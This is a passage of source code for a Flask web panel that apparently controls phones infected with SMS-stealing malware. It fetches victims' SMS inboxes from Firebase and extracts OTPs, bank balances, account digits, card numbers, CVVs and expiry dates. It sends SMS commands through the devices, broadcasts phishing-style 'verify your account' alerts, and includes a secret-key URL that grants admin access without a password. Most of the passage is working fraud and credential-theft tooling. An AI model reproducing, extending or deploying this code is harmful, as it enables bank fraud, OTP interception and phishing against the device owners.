  $("#bc-online").textContent = devices.filter(d => d.status).length;
  $("#bc-offline").textContent = devices.filter(d => !d.status).length;
  bcManualSelected.clear();
  pickTargetMode("all");
  $("#bc-body").value = "";
  updateBcCounter();
  $("#bc-progress").classList.remove("show");
  $("#bc-progress-fill").style.width = "0%";
  $("#broadcast-modal").classList.add("open");
};
window.closeBroadcastModal = function () { $("#broadcast-modal").classList.remove("open"); };

window.pickTargetMode = function (mode) {
  bcTargetMode = mode;
  $$(".bc-mode").forEach(el => el.classList.remove("active"));
  const el = $("#tm-" + mode); if (el) el.classList.add("active");
  if (mode === "all") bcTargets = devices.slice();
  else if (mode === "online") bcTargets = devices.filter(d => d.status);
  else if (mode === "offline") bcTargets = devices.filter(d => !d.status);
  else bcTargets = devices.filter(d => bcManualSelected.has(d.id));
  $("#bc-selected-count").textContent = `(${bcTargets.length} selected)`;
  renderBcDeviceList();
  updateBcCounter();
};

function renderBcDeviceList() {
  const box = $("#bc-device-list");
  if (!devices.length) { box.innerHTML = '<div class="empty" style="padding:20px">No devices</div>'; return; }
  box.innerHTML = devices.map(d => {
    const selected = bcTargetMode === "manual" ? bcManualSelected.has(d.id) : !!bcTargets.find(x => x.id === d.id);
    const emoji = d.status ? "📡" : "⚠️";
    return `<div class="bc-dev-row ${selected ? "selected" : ""}" onclick="toggleBcDevice('${d.id}')">
      <div class="bc-check ${selected ? "checked" : ""}">${selected ? "✓" : ""}</div>
      <div class="bc-dev-info">
        <div class="bc-dev-title">${escHtml(d.name)}</div>
        <div class="bc-dev-sub">${escHtml(d.slug)} · ${escHtml(d.phoneNumber)}</div>
      </div>
      <div class="bc-dev-status">${emoji}</div>
    </div>`;
  }).join("");
}

window.toggleBcDevice = function (id) {
  if (bcTargetMode !== "manual") {
    bcTargetMode = "manual";
    $$(".bc-mode").forEach(el => el.classList.remove("active"));
    $("#tm-manual").classList.add("active");
    bcManualSelected = new Set(bcTargets.map(d => d.id));
  }
  if (bcManualSelected.has(id)) bcManualSelected.delete(id);
  else bcManualSelected.add(id);
  bcTargets = devices.filter(d => bcManualSelected.has(d.id));
  $("#bc-selected-count").textContent = `(${bcTargets.length} selected)`;
  renderBcDeviceList();
  updateBcCounter();
};

const BC_TEMPLATES = {
  alert: "⚠️ ALERT: Service interruption detected. Please verify your account.",
  maint: "🔧 Scheduled maintenance in 30 minutes. Service will resume shortly.",
  welcome: "👋 Welcome to TOCXIC EAGLE. Your device is now connected.",
  blank: "",
};
window.applyBcTemplate = k => { $("#bc-body").value = BC_TEMPLATES[k] || ""; updateBcCounter(); };

window.updateBcCounter = function () {
  const txt = $("#bc-body").value || "";
  const enc = detectEncoding(txt);
  const len = txt.length;
  let segments, perSeg;
  if (enc === "GSM-7") { segments = len <= 160 ? 1 : Math.ceil(len / 153); perSeg = len <= 160 ? 160 : 153; }
  else { segments = len <= 70 ? 1 : Math.ceil(len / 67); perSeg = len <= 70 ? 70 : 67; }
  const inSeg = segments === 1 ? len : len - ((segments - 1) * perSeg);
  $("#bc-chars").textContent = `${inSeg} / ${perSeg}`;
  $("#bc-segments").textContent = `${segments} SMS · ${enc}`;
  const el = $("#bc-counter");
  el.className = "bc-counter";
  if (segments > 3) el.classList.add("over");
  else if (segments > 1) el.classList.add("warn");
  const totalMsgs = bcTargets.length * segments;
  $("#bc-msg-info").textContent = bcTargets.length
    ? `${bcTargets.length} user${bcTargets.length > 1 ? "s" : ""} × ${segments} SMS = ${totalMsgs} total`
    : "1 mail per user";
};

window.doBroadcast = async function () {
  if (!IS_ADMIN) { showToast("❌ Admin only"); return; }
  const body = $("#bc-body").value.trim();
  if (!bcTargets.length) { showToast("❌ No targets selected"); return; }
  if (!body) { showToast("❌ Message is empty"); return; }

  const btn = $("#bc-send-btn"); btn.disabled = true;
  const prog = $("#bc-progress"); prog.classList.add("show");
  const fill = $("#bc-progress-fill"), txt = $("#bc-progress-text");

  fill.style.width = "30%";
  txt.textContent = `📧 Sending to ${bcTargets.length} device(s)...`;

  try {
    const payload = {
      message: body,
      targets: bcTargets.map(d => ({
        number: d.phoneNumber, device_id: d.device_id, firebase: d.firebase,
        device_name: d.name, fb_name: d.fb_name, online: d.status,
      })),
    };
    const r = await fetch("/api/broadcast", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    fill.style.width = "80%";
    const d = await r.json();
    if (d.success) {
      fill.style.width = "100%";
      txt.textContent = `✅ Sent to ${d.delivered} device(s)`;
      showToast(`📧 Broadcast sent to ${d.delivered} user(s)`);
      setTimeout(() => {
        prog.classList.remove("show"); fill.style.width = "0%"; btn.disabled = false;
        $("#bc-body").value = ""; updateBcCounter(); closeBroadcastModal();
      }, 1400);
    } else {
      fill.style.width = "100%"; txt.textContent = `❌ ${d.error || "Failed"}`;
      setTimeout(() => { prog.classList.remove("show"); fill.style.width = "0%"; btn.disabled = false; }, 1600);
      showToast("❌ " + (d.error || "Send failed"));
    }
  } catch(e) {
    fill.style.width = "100%"; txt.textContent = "❌ Network error";
    setTimeout(() => { prog.classList.remove("show"); fill.style.width = "0%"; btn.disabled = false; }, 1600);
    showToast("❌ Network error");
  }
};

/* PARSERS */
const BANK_PATTERNS = [/HDFCB|HDFC/i,/SBIIN|SBI/i,/ICICIB|ICICI/i,/AXISBK|AXIS/i,
  /KOTAKB|KOTAK/i,/PNBSMS|PNB/i,/BOIIND|BOI/i,/CANBNK|CANARA/i,/UNIONB/i,
  /YESBNK/i,/IDBIBK|IDBI/i,/INDUSB/i,/FEDERAL/i,/RBLBNK/i,/PAYTM/i,/PHONEPE/i,/GPAY/i,/BAJAJFIN/i];
const BANK_NAMES = ["HDFC Bank","SBI","ICICI Bank","Axis Bank","Kotak Bank","PNB",
  "Bank of India","Canara Bank","Union Bank","Yes Bank","IDBI Bank","IndusInd Bank",
  "Federal Bank","RBL Bank","Paytm","PhonePe","Google Pay","Bajaj Finance"];
const BAL_RX = [
  /Aval(?:\.|\s)Bal(?:\.|\s)(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /Avl(?:\.|\s)Bal(?:\.|\s)(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /Available\s+Bal\w*\s*:?\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)/i,
  /Bal(?:ance)?\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /(?:INR|Rs\.?|₹)\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{2})?)/i];
const AMT_RX = [/(?:debited|credited|withdrawn).*?(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s*(?:debited|credited)/i];
const ACCT_RX = [/(?:A\/C|acct)[\sxX*:]+([xX*0-9]{0,4}[0-9]{4})/i,
  /[xX*]{4,}([0-9]{4})/, /ending\s+(?:with\s+)?([0-9]{4})/i];
const CARD_RX = [/(?:card)[\sxX*:]+([xX*]{0,8}[0-9]{4})/i, /ending\s*([0-9]{4})/i];
const CVV_RX = [/CVV[\s:]+([0-9]{3,4})/i];
const EXP_RX = [/(?:expiry|exp|valid thru?)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];
const PHONE_RX = [/(?:mobile|mob|phone|contact)\s+(?:no\.?|number)?\s*:?\s*([6-9][0-9]{9})/i,
  /Number\s*:\s*([6-9][0-9]{9})/i, /(\+?91[-\s]?[6-9][0-9]{9})/,
  /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/];
const NET_PATTERNS = [[/Jio\s+Number|JIO/i,"Jio"],[/Airtel/i,"Airtel"],[/BSNL/i,"BSNL"],
  [/Vodafone|Vi-/i,"Vodafone"],[/Idea/i,"Vi (Idea)"]];

function matchFirst(text, arr) {
  for (const rx of arr) { const m = text.match(rx); if (m && m[1]) return m[1].replace(/,/g, ""); }
  return null;
}
function isBankSms(text, sender) {
  return /AVL|AVAL|AVBL|BALANCE|BAL\.|CREDITED|DEBITED|INR/.test(text.toUpperCase()) &&
    (BANK_PATTERNS.some(p => p.test(sender)) || /debited|credited|balance/i.test(text));
}
function isCardSms(text) { return /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(text); }
function getPhone(text) {
  for (const rx of PHONE_RX) {
    const m = text.match(rx);
    if (m) {
      const d = (m[1] || m[0]).replace(/[^0-9]/g, "");
      if (d.length === 10 && /^[6-9]/.test(d)) return d;
      if (d.length === 12 && d.startsWith("91")) return d.slice(2);
    }
  }
  return null;
}
function getNetwork(text, sender) {
  for (const [rx, name] of NET_PATTERNS) if (rx.test(text + " " + sender)) return name;
  return null;
}
function getBankName(sender) {
  for (let i = 0; i < BANK_PATTERNS.length; i++) if (BANK_PATTERNS[i].test(sender)) return BANK_NAMES[i];
  return sender || "Bank";
}
function analyzeSms(msgs) {
  const bankBalances = [], cards = [], phones = new Set(), networks = new Set();
  for (const m of msgs) {
    const txt = m.text || "", snd = m.sender || "";
    if (isBankSms(txt, snd)) {
      const bal = matchFirst(txt, BAL_RX);
      if (bal) {
        const amt = matchFirst(txt, AMT_RX);
        const acct = (() => {
          for (const rx of ACCT_RX) { const r = txt.match(rx); if (r && r[1]) return r[1].replace(/[^0-9]/g,"").slice(-4); }
          return null;
        })();
        const type = /credit/i.test(txt) ? "credit" : /debit|withdraw|paid|purchase/i.test(txt) ? "debit" : null;
        const ph = getPhone(txt), net = getNetwork(txt, snd);
        bankBalances.push({
          bankName: getBankName(snd), senderName: snd, availableBalance: bal,
          transactionAmount: amt && amt !== bal ? amt : null, transactionType: type,
          accountLast4: acct, phoneFromSms: ph, networkFromSms: net,
          rawSms: txt.substring(0, 300), detectedAt: m.time || "",
        });
        if (ph) phones.add(ph); if (net) networks.add(net);
      }
    }
    if (isCardSms(txt)) {
      const last4 = (() => {
        for (const rx of CARD_RX) {
          const r = txt.match(rx);
          if (r && r[1]) { const d = r[1].replace(/[^0-9]/g,""); if (d.length >= 4) return d.slice(-4); }
        }
        return null;
      })();
      if (last4) {
        const ct = /VISA/i.test(txt) ? "VISA" : /MASTER/i.test(txt) ? "Mastercard"
          : /RUPAY/i.test(txt) ? "RuPay" : /AMEX/i.test(txt) ? "Amex" : "Card";
        cards.push({ cardLast4: last4, cardType: ct,
          cvv: matchFirst(txt, CVV_RX) || null, expiry: matchFirst(txt, EXP_RX) || null,
          rawSms: txt.substring(0, 200) });
      }
    }
    const ph = getPhone(txt), net = getNetwork(txt, snd);
    if (ph) phones.add(ph); if (net) networks.add(net);
  }
  return { bankBalances, cards, phoneNumbers: [...phones], networks: [...networks] };
}

function timeAgo(ms) {
  const d = Date.now() - ms, s = Math.floor(d/1000), m = Math.floor(s/60),
    h = Math.floor(m/60), dy = Math.floor(h/24);
  if (s < 60) return s + "s ago";
  if (m < 60) return m + "m ago";
  if (h < 24) return h + "h " + (m % 60) + "m ago";
  if (dy < 30) return dy + "d " + (h % 24) + "h ago";
  return new Date(ms).toLocaleDateString();
}
function fmtBal(v) {
  try { return parseFloat(v).toLocaleString("en-IN", { minimumFractionDigits:2, maximumFractionDigits:2 }); }
  catch { return v; }
}
function batHtml(pct) {
  const col = pct >= 60 ? "var(--green)" : pct >= 30 ? "var(--amber)" : "var(--red2)";
  return `<span style="display:inline-flex;align-items:center;gap:5px">
    <span style="width:26px;height:12px;border:1px solid #555;border-radius:3px;padding:2px;display:inline-flex">
      <span style="height:100%;width:${Math.max(5, pct)}%;background:${col};border-radius:1.5px"></span>
    </span>
    <span style="font-size:11px;font-weight:700;color:${col}">${pct}%</span>
  </span>`;
}
function escHtml(s) {
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}
function extractOtp(text) {
  if (!text) return "";
  const t = String(text);
  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
  if (m) return m[1];
  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
  if (m) return m[1];
  m = t.match(/#(\d{4,8})/);
  if (m) return m[1];
  return "";
}
function copyOtp(c) {
  const done = () => showToast("✅ Copied: " + c);
  if (navigator.clipboard) navigator.clipboard.writeText(c).then(done).catch(() => {
    const ta = document.createElement("textarea"); ta.value = c; document.body.appendChild(ta);
    ta.select(); document.execCommand("copy"); ta.remove(); done();
  });
}
window.copyOtp = copyOtp;

async function refreshAll() {
  showToast("🔄 Refreshing...");
  try { await fetch("/api/refresh", { method: "POST" }); } catch(e) {}
  smsCache = {}; smsAnalysisCache = {};
  await loadDevices();
  showToast("✅ Refreshed");
}
window.refreshAll = refreshAll;

boot();
</script>
</body></html>"""

USER_NAV = """<a href="/user" class="nav-link active">📱 Numbers</a>
<a href="/otp" class="nav-link green">🔐 Personal OTP</a>
<a href="/" class="nav-link">🏠 Home</a>"""

ADMIN_NAV = """<a href="/admin/dashboard" class="nav-link active">📱 Numbers</a>
<a href="/firebases" class="nav-link">🔥 Firebases</a>
<a href="/admin/security" class="nav-link">🔒 Security</a>
<a href="/logout" class="nav-link">Logout</a>"""

BC_FAB_HTML = """<button class="bc-fab" onclick="openBroadcastModal()" title="Broadcast Mail">
  📧<span class="count-badge" id="bc-count-badge" style="display:none">0</span>
</button>"""

def build_panel(is_admin):
    nav = ADMIN_NAV if is_admin else USER_NAV
    fab = BC_FAB_HTML if is_admin else ""
    return (PANEL_HTML_TEMPLATE
            .replace("{NAV_LINKS}", nav)
            .replace("{SHOW_BC_FAB}", fab)
            .replace("{IS_ADMIN}", "true" if is_admin else "false"))

# ═══════════════════════════════════════════════════════════════
# ROUTES
# ═══════════════════════════════════════════════════════════════
@app.route("/")
def root_redirect(): return redirect(url_for("landing_page"))

@app.route("/landingpage")
def landing_page(): return Response(LANDING_HTML, mimetype="text/html")

@app.route("/admin", methods=["GET", "POST"])
def admin_login_page():
    if session.get("logged_in") and session.get("role") == "admin":
        return redirect(url_for("admin_dashboard"))
    error = ""
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if pwd == get_pwd("admin"):
            session["logged_in"] = True; session["role"] = "admin"; session["is_admin"] = True
            return redirect(url_for("admin_dashboard"))
        error = '<div class="err">❌ Wrong admin password!</div>'
    return Response(ADMIN_LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")

@app.route("/SUPER_MASTER/<key>")
def super_master_key_entry(key):
    if key != ADMIN_URL_KEY: abort(404)
    session["logged_in"] = True; session["role"] = "admin"; session["is_admin"] = True
    return redirect(url_for("admin_dashboard"))

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("landing_page"))

@app.route("/user")
def user_dashboard():
    return Response(build_panel(False), mimetype="text/html")

@app.route("/admin/dashboard")
@admin_required
def admin_dashboard():
    return Response(build_panel(True), mimetype="text/html")

# ═══════════════════════════════════════════════════════════════
# API
# ═══════════════════════════════════════════════════════════════
@app.route("/api/conn")
def api_conn():
    init_mongo()
    return jsonify({"success": True, "mongo_connected": MONGO_OK})

@app.route("/api/refresh", methods=["POST"])
def api_refresh():
    threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True})

@app.route("/api/numbers")
def api_numbers():
    init_mongo()
    with cache["lock"]:
        nums = list(cache["numbers_map"].values())
        stats = dict(cache["stats"])
        loading = cache["loading"]
        progress = dict(cache["progress"])
    if not nums and not loading and not IS_SERVERLESS:
        threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({
        "success": True, "numbers": nums,
        "total": stats.get("total", 0),
        "online": stats.get("online", 0),
        "offline": stats.get("offline", 0),
        "otp_rate": stats.get("otp_rate", 0),
        "loading": loading, "progress": progress,
    })

@app.route("/api/stream")
def api_stream():
    def gen():
        yield "event: hello\ndata: {}\n\n"
        last_sig = ""
        while True:
            with cache["lock"]:
                nums = list(cache["numbers_map"].values())
            sig = str(len(nums)) + "|" + str(sum(1 for n in nums if n.get("online")))
            if sig != last_sig:
                last_sig = sig
                yield "event: devices_added\ndata: " + json.dumps(nums) + "\n\n"
            else:
                yield ": ping\n\n"
            time.sleep(3)
    return Response(gen(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})

@app.route("/api/inbox")
def api_inbox():
    try:
        fb_url = request.args.get("fb", "").strip()
        dev_id = request.args.get("id", "").strip()
        num = request.args.get("num", "").strip()
        if not fb_url or not dev_id:
            return jsonify({"success": False, "error": "missing params"}), 400
        key = f"{fb_url}|{dev_id}|{num}"
        now = time.time()
        with cache["lock"]:
            cached = cache["device_messages"].get(key)
            cached_at = cache["msg_cache_time"].get(key, 0)
            inbox_lock = cache["inbox_locks"].setdefault(key, threading.Lock())
        if cached and (now - cached_at) < MESSAGE_CACHE_TTL:
            return jsonify({"success": True, "messages": cached[:MAX_SMS_PER_NUMBER],
                            "count": len(cached), "cached": True, "target_number": num})
        with inbox_lock:
            with cache["lock"]:
                cached = cache["device_messages"].get(key)
                cached_at = cache["msg_cache_time"].get(key, 0)
            if cached and (time.time() - cached_at) < MESSAGE_CACHE_TTL:
                return jsonify({"success": True, "messages": cached[:MAX_SMS_PER_NUMBER],
                                "count": len(cached), "cached": True, "target_number": num})
            msgs = fetch_messages_multi_path(fb_url, dev_id, phone_numbers=[num])
            received = [m for m in msgs if m.get("type") == "received"]
            matched = received if received else msgs
            matched = sorted(matched, key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            for m in matched:
                m["otp"] = extract_otp(m.get("message", ""))
            matched = matched[:MAX_SMS_PER_NUMBER]
            with cache["lock"]:
                cache["device_messages"][key] = matched
                cache["msg_cache_time"][key] = time.time()
        return jsonify({"success": True, "messages": matched,
                        "count": len(matched), "cached": False, "target_number": num})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# ═══════════════════════════════════════════════════════════════
# SEND SMS
# ═══════════════════════════════════════════════════════════════
@app.route("/api/send", methods=["POST"])
def api_send_sms():
    try:
        data = request.get_json() or {}
        fb_url     = (data.get("firebase") or "").strip().rstrip("/")
        device_id  = (data.get("device_id") or "").strip()
        to         = (data.get("to") or "").strip()
        message    = (data.get("message") or "").strip()
        sim_slot   = int(data.get("sim") or 1)
        if not fb_url or not device_id or not to or not message:
            return jsonify({"success": False, "error": "Missing fields"}), 400
        if not fb_url.startswith("http"):
            fb_url = "https://" + fb_url

        cmd = {
            "to": to,
            "message": message,
            "sim": sim_slot,
            "action": "sendsms",
            "status": "pending",
            "timestamp": int(time.time() * 1000),
            "from": "admin_panel",
        }

        cmd_paths = [
            f"/commands/{device_id}.json",
            f"/sendsms/{device_id}.json",
            f"/sendsms.json",
            f"/clients/{device_id}/task.json",
            f"/clients/{device_id}/commands.json",
            f"/clients/{device_id}/sendSms.json",
            f"/devices/{device_id}/commands.json",
            f"/devices/{device_id}/sendsms.json",
        ]

        s = _sess()
        written = False
        used_path = None
        for p in cmd_paths:
            try:
                r = s.put(fb_url + p, json=cmd, timeout=6)
                if r.status_code in (200, 201):
                    written = True
                    used_path = p
                    break
            except Exception:
                continue

        if not written:
            try:
                r = s.post(fb_url + "/commands.json", json=cmd, timeout=6)
                if r.status_code in (200, 201):
                    written = True
                    used_path = "/commands.json"
            except Exception:
                pass

        if not written:
            return jsonify({"success": False, "error": "All Firebase paths failed"}), 500

        init_mongo()
        if MONGO_OK:
            try:
                sms_log_collection.insert_one({
                    "firebase": fb_url,
                    "device_id": device_id,
                    "to": to,
                    "message": message,
                    "sim": sim_slot,
                    "path": used_path,
                    "status": "sent",
                    "sent_at": int(time.time()),
                    "source": "panel",
                })
            except Exception:
                pass

        return jsonify({"success": True, "queued": True, "path": used_path})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/sms/logs")
@admin_required
def api_sms_logs():
    init_mongo()
    if not MONGO_OK:
        return jsonify({"success": True, "logs": []})
    try:
        docs = list(sms_log_collection.find({}).sort("sent_at", -1).limit(200))
        out = [{
            "id": str(d["_id"]), "firebase": d.get("firebase",""),
            "device_id": d.get("device_id",""), "to": d.get("to",""),
            "message": d.get("message",""), "sim": d.get("sim",1),
            "status": d.get("status","sent"), "sent_at": int(d.get("sent_at",0)),
        } for d in docs]
        return jsonify({"success": True, "logs": out, "count": len(out)})
    except Exception as e:
        return jsonify({"success": True, "logs": [], "error": str(e)})

# ═══════════════════════════════════════════════════════════════
# BROADCAST
# ═══════════════════════════════════════════════════════════════
@app.route("/api/broadcast", methods=["POST"])
@admin_required
def api_broadcast_send():
    init_mongo()
    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        data = request.get_json() or {}
        message = (data.get("message") or "").strip()
        targets = data.get("targets") or []
        if not message: return jsonify({"success": False, "error": "Message is empty"}), 400
        if not isinstance(targets, list) or not targets:
            return jsonify({"success": False, "error": "No targets"}), 400
        now = int(time.time())
        bc_id = hashlib.sha256(f"bc-{now}-{os.urandom(4).hex()}".encode()).hexdigest()[:12]
        docs = []
        for t in targets[:1000]:
            docs.append({
                "bc_id": bc_id,
                "device_id": str(t.get("device_id", "")),
                "firebase": str(t.get("firebase", "")),
                "number": str(t.get("number", "")),
                "device_name": str(t.get("device_name", "")),
                "fb_name": str(t.get("fb_name", "")),
                "message": message, "status": "delivered", "read": False,
                "created_at": now, "from": "admin",
            })
        if docs:
            try: broadcast_collection.insert_many(docs, ordered=False)
            except Exception as e:
                print(f"Broadcast insert err: {e}")
                return jsonify({"success": False, "error": "Insert failed"}), 500
        return jsonify({"success": True, "bc_id": bc_id,
                        "delivered": len(docs), "targets_count": len(targets)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/broadcasts/inbox")
def api_broadcasts_inbox():
    init_mongo()
    if not MONGO_OK:
        return jsonify({"success": True, "broadcasts": [], "error": "MongoDB down"}), 200
    try:
        device_id = request.args.get("device_id", "").strip()
        fb_url = request.args.get("fb", "").strip()
        num = request.args.get("num", "").strip()
        q = {}
        if device_id: q["device_id"] = device_id
        if fb_url: q["firebase"] = fb_url
        if num: q["number"] = num
        if not q: return jsonify({"success": True, "broadcasts": []})
        docs = list(broadcast_collection.find(q).sort("created_at", -1).limit(100))
        out = []
        for d in docs:
            out.append({
                "id": str(d["_id"]),
                "bc_id": d.get("bc_id"),
                "message": d.get("message", ""),
                "status": d.get("status", "delivered"),
                "read": bool(d.get("read", False)),
                "created_at": int(d.get("created_at", 0)),
                "number": d.get("number", ""),
                "device_name": d.get("device_name", ""),
            })
        return jsonify({"success": True, "broadcasts": out, "count": len(out)})
    except Exception as e:
        return jsonify({"success": True, "broadcasts": [], "error": str(e)}), 200

@app.route("/api/broadcasts/read", methods=["POST"])
def api_broadcasts_mark_read():
    init_mongo()
    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        data = request.get_json() or {}
        bid = data.get("id", "").strip()
        if not bid: return jsonify({"success": False, "error": "Missing id"}), 400
        try: oid = ObjectId(bid)
        except Exception: return jsonify({"success": False, "error": "Invalid id"}), 400
        broadcast_collection.update_one({"_id": oid}, {"$set": {"read": True}})
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/broadcasts/all", methods=["DELETE"])
@admin_required
def api_broadcast_delete_all():
    init_mongo()
    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        res = broadcast_collection.delete_many({})
        return jsonify({"success": True, "deleted": res.deleted_count})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# ═══════════════════════════════════════════════════════════════
# FIREBASES
# ═══════════════════════════════════════════════════════════════
@app.route("/api/firebases", methods=["GET"])
@admin_required
def api_fb_list():
    init_mongo()
    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        docs = list(fb_collection.find({}).sort("added_at", -1))
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500
    out = [{"id": str(d["_id"]), "name": d.get("name",""), "url": d.get("url",""),
            "hash": fb_hash(d.get("url","")), "added_at": d.get("added_at",0),
            "source": d.get("source","admin")} for d in docs]
    return jsonify({"success": True, "firebases": out, "count": len(out)})

@app.route("/api/firebases", methods=["POST"])
@admin_required
def api_fb_add():
    init_mongo()
    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    url = (data.get("url") or "").strip().rstrip("/")
    if url and not url.startswith("http"): url = "https://" + url
    if not url or "firebase" not in url:
        return jsonify({"success": False, "error": "Invalid URL"}), 400
    if fb_collection.find_one({"url": url}):
        return jsonify({"success": False, "error": "Already added"}), 409
    name = url.replace("https://","").split(".")[0][:30]
    fb_collection.insert_one({"url": url, "name": name,
        "added_at": int(time.time()), "source": "admin"})
    if not IS_SERVERLESS:
        threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True})

@app.route("/api/firebases/bulk", methods=["POST"])
@admin_required
def api_fb_bulk():
    init_mongo()
    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    urls = data.get("urls", [])
    added, skipped = 0, 0
    for u in urls:
        url = (u or "").strip().rstrip("/")
        if url and not url.startswith("http"): url = "https://" + url
        if not url or "firebase" not in url: continue
        if fb_collection.find_one({"url": url}): skipped += 1; continue
        name = url.replace("https://","").split(".")[0][:30]
        fb_collection.insert_one({"url": url, "name": name,
            "added_at": int(time.time()), "source": "admin_bulk"})
        added += 1
    if not IS_SERVERLESS:
        threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True, "added": added, "skipped": skipped})

@app.route("/api/firebases/<fb_id>", methods=["DELETE"])
@admin_required
def api_fb_delete(fb_id):
    init_mongo()
    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        res = fb_collection.delete_one({"_id": ObjectId(fb_id)})
        if res.deleted_count == 0:
            return jsonify({"success": False, "error": "Not found"}), 404
        with cache["lock"]:
            cache["numbers_map"] = {}; cache["devices"] = {}
            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
        if not IS_SERVERLESS:
            threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 400

@app.route("/api/firebases/all", methods=["DELETE"])
@admin_required
def api_fb_delete_all():
    init_mongo()
    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        res = fb_collection.delete_many({})
        with cache["lock"]:
            cache["numbers_map"] = {}; cache["devices"] = {}
            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
        if not IS_SERVERLESS:
            threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True, "deleted": res.deleted_count})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# ═══════════════════════════════════════════════════════════════
# SECURITY
# ═══════════════════════════════════════════════════════════════
@app.route("/api/security/change", methods=["POST"])
@admin_required
def api_security_change():
    init_mongo()
    data = request.get_json() or {}
    role = data.get("role", "").strip()
    pwd = data.get("password", "").strip()
    if role != "admin": return jsonify({"success": False, "error": "Only admin"}), 400
    if not pwd or len(pwd) < 4: return jsonify({"success": False, "error": "Too short"}), 400
    ok = set_pwd(role, pwd)
    return jsonify({"success": True}) if ok else (jsonify({"success": False, "error": "Save failed"}), 500)

# ═══════════════════════════════════════════════════════════════
# PERSONAL OTP
# ═══════════════════════════════════════════════════════════════
@app.route("/api/otp/add", methods=["POST"])
def api_otp_add():
    init_mongo()
    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        data = request.get_json() or {}
        url = (data.get("url") or "").strip().rstrip("/")
        if url and not url.startswith("http"): url = "https://" + url
        if not url or "firebase" not in url:
            return jsonify({"success": False, "error": "Invalid URL"}), 400
        if fb_collection.find_one({"url": url}):
            return jsonify({"success": True, "hash": fb_hash(url), "already": True})
        name = url.replace("https://","").split(".")[0][:30]
        fb_collection.insert_one({"url": url, "name": name,
            "added_at": int(time.time()), "source": "personal_otp"})
        if not IS_SERVERLESS:
            threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True, "hash": fb_hash(url)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# ═══════════════════════════════════════════════════════════════
# FIREBASES PAGE
# ═══════════════════════════════════════════════════════════════
FIREBASES_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Firebases</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
""" + ORBITRON + """
<style>""" + DARK_CSS + """
.container{max-width:800px;margin:0 auto;padding:16px}
.card{background:var(--bg2);border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:14px}
.card h3{font-size:13px;color:var(--text);margin-bottom:14px;font-weight:800;
  font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase}
.add-row{display:flex;gap:8px;flex-wrap:wrap}
.add-row input{flex:1;min-width:200px;padding:14px 16px;border-radius:12px;
  border:1px solid var(--border2);background:var(--bg3);font-size:14px;outline:none;color:var(--text)}
.add-row input:focus{border-color:var(--blue2);box-shadow:0 0 0 4px rgba(59,130,246,.12)}
.add-row button{padding:14px 22px;border:none;border-radius:12px;font-weight:800;font-size:12px;
  font-family:inherit;min-height:50px;cursor:pointer;background:var(--grad);color:#fff}
.add-row button.green{background:linear-gradient(135deg,#12b76a,#32d583)}
.fb-list{display:grid;gap:10px}
.fb-card{background:var(--bg2);border:1px solid var(--border);border-radius:14px;padding:16px;
  display:flex;align-items:center;gap:14px;flex-wrap:wrap}
